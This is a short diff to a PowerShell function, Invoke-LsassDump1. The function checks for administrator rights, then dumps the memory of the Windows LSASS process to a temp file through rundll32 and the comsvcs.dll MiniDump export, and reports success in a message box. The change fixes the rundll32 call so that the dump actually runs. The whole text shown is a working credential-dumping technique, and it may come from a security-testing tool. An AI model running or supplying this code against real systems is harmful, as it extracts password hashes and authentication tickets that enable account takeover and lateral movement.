@@ -30,7 +30,7 @@ function Invoke-LsassDump1 {
 		$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent());
 		if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){
 			$fileName = [System.IO.Path]::GetTempPath()+[System.IO.Path]::GetRandomFileName();
-			.\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id $fileName full
+			rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id $fileName full
 			Start-Sleep 3
 			If ([System.IO.File]::Exists($fileName)) {
 				[System.Windows.MessageBox]::Show('Lsass dump worked - '+$fileName);
